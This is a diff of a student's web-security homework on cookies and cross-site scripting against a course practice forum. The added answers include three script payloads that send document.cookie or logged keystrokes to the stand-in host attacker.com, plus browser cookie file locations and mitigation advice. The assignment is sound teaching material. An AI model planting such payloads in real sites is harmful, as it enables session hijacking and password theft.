@@ -59,23 +59,89 @@ This assignment explores cookies and Cross-Site Scripting (XSS) in the [Fake Dis
 ### i. OS Cookie Storage
 
 **Question:** Where does your OS (the OS where you're running your browser and Burpsuite, that is) store cookies? (This will require some internet searching, most likely.)  
-**Answer:** Cookie storage locations depend on the OS and browser being used. For instance:
+**Answer:** My computer is macOS, and Burp Suite is running on Kali Linux.
 
-- On **Windows**, most browsers (like Chrome and Firefox) store cookies in user-specific directories within `AppData`, such as `AppData\Local\Google\Chrome\User Data\Default\Cookies` for Chrome.
-- On **macOS**, Chrome and Firefox typically store cookies in `~/Library/Application Support/` within respective browser folders.
-- On **Linux**, cookies are generally stored in `~/.config` for browsers like Chrome and Firefox, within their respective directories.
-  Cookies are often stored in SQLite databases or similar formats, depending on the browser.
+- On **macOS**:
 
----
+  - **Chrome** stores cookies in `~/Library/Application Support/Google/Chrome/Default/Cookies`
+
+- On **Linux** (Kali):
+  - **Firefox** stores cookies in `~/.mozilla/firefox/[profile_name]/cookies.sqlite`.
+
+## Cookies are typically stored in SQLite databases or similar formats, depending on the browser and setup.
 
 ## Part 2: Cross-Site Scripting (XSS)
 
 ### a. Provide a diagram and/or a step-by-step description of the nature and timing of Moriarty's attack on users of the FDF. Note that some of the relevant actions may happen long before other actions.
 
+1. **Step 1:** Moriarty creates a post with embedded JavaScript in the post body.
+2. **Step 2:** The JavaScript code is designed to execute when someone views Moriarty's post.
+3. **Step 3:** When a user clicks on Moriarty’s post title, the JavaScript runs, manipulating the FDF page. This may include unexpected changes, like altering text color, displaying pop-ups, or more.
+4. **Step 4:** The malicious JavaScript affects all users who view the post, creating a persistent, client-side effect on the FDF interface.
+
+---
+
 ### b. Describe an XSS attack that is more virulent than Moriarty's "turn something red" and "pop up a message" attacks. Think about what kinds of things the Javascript might have access to via Alice's browser when Alice views the attacker's post.
+
+/////I HAVEN'T TESTED IT YET BECAUSE THE FDF WAS DOWN UNINTENTIONALLY
+The attacker might gather information about theme preference of each user to observe user settings across different users, then combine these data to gain insights about user behavior. In this case, the script could retrieve Alice's theme color cookie and send it to an external server controlled by the attacker, allowing the attacker to collect data about Alice's preferences on this website. This will get Alice's cookie info about the theme color! red or blue or default.
+
+```html
+<script>
+  fetch("https://attacker.com/steal-theme", {
+    method: "POST",
+    body: `theme=${document.cookie}`,
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+    },
+  });
+</script>
+```
+
+Moreover, the script could retrieve Alice's authentication cookies (when there are more sensitive cookies) and send them to an external server controlled by the attacker. With these cookies, the attacker could impersonate Alice, gain access to her account, and post malicious content under her name.
+
+/////I HAVEN'T TESTED IT YET BECAUSE THE FDF WAS DOWN UNINTENTIONALLY
+
+```html
+<script>
+  fetch("https://attacker.com/steal-cookie", {
+    method: "POST",
+    body: document.cookie,
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+    },
+  });
+</script>
+```
+
+---
 
 ### c. Do it again: describe a second attack that is more virulent than Moriarty's, but that's substantially different from your first idea.
 
+This JavaScript could capture sensitive information like usernames, passwords, and other personal information as users type. The data could then be sent to the attacker’s server, compromising the security of any user interacting with the page.
+
+/////I HAVEN'T TESTED IT YET BECAUSE THE FDF WAS DOWN UNINTENTIONALLY
+
+```html
+<script>
+  document.addEventListener("keypress", function (event) {
+    fetch("https://attacker.com/keystrokes", {
+      method: "POST",
+      body: JSON.stringify({ key: event.key }),
+      headers: {
+        "Content-Type": "application/json",
+      },
+    });
+  });
+</script>
+```
+
+---
+
 ### d. What techniques can the server or the browser use to prevent what Moriarty is doing?
+
+1. The server should sanitize all user input to prevent users from embedding executable scripts. This would include removing any `<script>` tags or attributes that can execute code, such as `onclick`, `onload`, or `style`.
+
+2. Set cookies with the HttpOnly and SameSite flags to prevent JavaScript from accessing them directly and to reduce the risk of session hijacking.
 
 ---
